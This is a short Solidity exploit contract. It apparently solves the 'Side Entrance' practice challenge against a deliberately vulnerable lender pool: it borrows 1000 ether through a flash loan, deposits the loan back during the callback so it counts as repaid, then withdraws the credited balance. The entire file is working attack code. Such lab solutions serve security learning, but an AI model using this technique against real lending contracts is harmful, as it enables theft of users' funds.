pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";

contract AttackerSide {
    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function execute() external payable {
        pool.deposit{value: 1000 ether}();
    }

    function attack() public payable {
        pool.flashLoan(1000 ether);
        pool.withdraw();
    }

    receive() external payable {}
}
